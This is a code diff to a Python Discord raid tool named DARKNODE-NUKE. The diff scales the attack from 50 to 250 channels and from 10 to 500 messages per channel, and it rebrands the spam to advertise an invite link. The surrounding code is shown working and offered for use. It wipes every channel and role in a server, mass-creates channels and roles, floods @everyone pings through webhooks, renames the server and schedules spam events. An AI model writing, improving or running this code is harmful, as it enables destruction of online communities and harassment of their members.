@@ -21,18 +21,18 @@ init(autoreset=True)
 
 NO_BAN_KICK_ID = []
 
-PUB         = "||@everyone||  **# NUKED BY DARKNODE**  :  discord.gg/cxi"
-PUB_SHORT   = "discord.gg/cxi | NUKED BY DARKNODE"
+PUB         = "# ||@everyone|| GET NUKED BY DARKNODE   [join now!](https://discord.gg/cxi)"
+PUB_SHORT   = "# ||@everyone|| # GET NUKED BY DARKNODE | discord.gg/cxi"
 DISCORD_URL = "https://discord.gg/cxi"
 GITHUB_URL  = "https://github.com/6js3"
-RAID_NAME   = "raid-by-darknode"
+RAID_NAME   = "NUKED-BY-DARKNODE"
 TOOL_NAME   = "DARKNODE-NUKE"
 
 AUTO_RAID_CONFIG = {
     "channel_type"   : "text",
     "channel_name"   : RAID_NAME,
-    "num_channels"   : 50,
-    "num_messages"   : 10,
+    "num_channels"   : 250,
+    "num_messages"   : 500,
     "message_content": PUB,
 }
 
@@ -59,7 +59,7 @@ EMBED_CONFIG = {
 
 WEBHOOK_CONFIG = {"default_name": "DARKNODE-NUKE"}
 SERVER_CONFIG  = {
-    "new_name"       : "RAIDED BY DARKNODE-NUKE",
+    "new_name"       : "NUKED BY DARKNODE-NUKE",
     "new_icon"       : "",
     "new_description": "discord.gg/cxi",
 }
@@ -494,24 +494,24 @@ async def nuke(sid):
         asyncio.gather(*[delete_role(r)    for r in list(g.roles)]),
     )
     log_ok(f"wiped  {cr.count(True)} channels  {rr.count(True)} roles")
-    fx_load("create 50 channels", 22, .014)
-    created = await asyncio.gather(*[g.create_text_channel(RAID_NAME) for _ in range(50)], return_exceptions=True)
+    fx_load("create 250 channels", 22, .014)
+    created = await asyncio.gather(*[g.create_text_channel(RAID_NAME) for _ in range(250)], return_exceptions=True)
     new_chans = [c for c in created if isinstance(c, discord.TextChannel)]
     log_ok(f"{len(new_chans)} channels ready")
     fx_load("create 50 roles", 22, .014)
     async def _make_role():
         try:
             col = discord.Colour.from_rgb(random.randint(180,255), 0, 0)
-            await g.create_role(name="DARKNODE-NUKE", colour=col); return True
+            await g.create_role(name=".gg/cxi", colour=col); return True
         except: return False
     rr2 = await asyncio.gather(*[_make_role() for _ in range(50)])
-    log_ok(f"{rr2.count(True)} roles DARKNODE-NUKE created")
+    log_ok(f"{rr2.count(True)} roles .gg/cxi created")
     fx_load("webhook spam", 22, .014)
     async def _raid_chan(chan):
         try:
-            wh = await chan.create_webhook(name="DARKNODE-NUKE TOOLS")
+            wh = await chan.create_webhook(name=".gg/cxi")
             for _ in range(5):
-                try: await wh.send(content=PUB, username="DARKNODE-NUKE TOOLS")
+                try: await wh.send(content=PUB, username=".gg/cxi")
                 except: pass
             try: await wh.delete()
             except: pass
@@ -519,7 +519,7 @@ async def nuke(sid):
         except Exception as e: log_err(f"#{chan.name}  {_vis(str(e))}")
     await asyncio.gather(*[_raid_chan(c) for c in new_chans])
     fx_glitch(f"NUKE COMPLETE  |  {g.name}")
-    _summary("Nuke", len(new_chans), 50-len(new_chans), time.perf_counter()-t)
+    _summary("Nuke", len(new_chans), 250-len(new_chans), time.perf_counter()-t)
 
 async def auto_raid(sid):
     g = _get_guild(sid)
@@ -532,10 +532,10 @@ async def auto_raid(sid):
     async def _role():
         try:
             col = discord.Colour.from_rgb(random.randint(180,255), 0, 0)
-            await g.create_role(name="DARKNODE-NUKE", colour=col); return True
+            await g.create_role(name=".gg/cxi", colour=col); return True
         except: return False
     await asyncio.gather(*[_role() for _ in range(50)])
-    log_ok("50 roles DARKNODE-NUKE created")
+    log_ok("50 roles .gg/cxi created")
     await asyncio.gather(*[_send_to(c, AUTO_RAID_CONFIG['num_messages'], AUTO_RAID_CONFIG['message_content'], False) for c in g.channels if isinstance(c, discord.TextChannel)])
     fx_glitch(f"RAID DONE  |  {g.name}")
     _summary("Auto Raid", ch.count(True)+sum(r is not None for r in cr), ch.count(False)+sum(r is None for r in cr), time.perf_counter()-t)
@@ -710,7 +710,7 @@ async def event_spam(sid):
     _section("EVENT SPAM")
     try: count = int(_ask("quantity"))
     except ValueError: return log_err("invalid")
-    name = _ask("event name  [enter = pub]") or "DARKNODE-NUKE TOOLS"
+    name = _ask("event name  [enter = pub]") or "GET NUKED BY DARKNODE"
     desc = _ask("description [enter = pub]") or f"**RAIDED BY DARKNODE-NUKE**\n{PUB_SHORT}"
     fx_load("scheduling", 18, .018)
     t = time.perf_counter(); ok=fail=0
@@ -992,7 +992,7 @@ async def create_roles(sid):
     _section("CREATE ROLES")
     try: num = int(_ask("quantity"))
     except ValueError: return log_err("invalid")
-    name = _ask("role name  [enter = pub]") or "DARKNODE-NUKE"
+    name = _ask("role name  [enter = pub]") or ".gg/cxi"
     fx_load("generating", 18, .018)
     t = time.perf_counter()
     async def _cr():
@@ -1057,7 +1057,7 @@ async def rename_all_channels(sid):
 async def rename_all_roles(sid):
     g = _get_guild(sid)
     if not g: return
-    _section("RENAME ROLES"); name = _ask("new name  [enter = pub]") or "DARKNODE-NUKE"
+    _section("RENAME ROLES"); name = _ask("new name  [enter = pub]") or ".gg/cxi"
     fx_load("renaming", 18, .018)
     t = time.perf_counter(); ok=fail=0
     for i, r in enumerate([r for r in g.roles if not r.is_default()]):
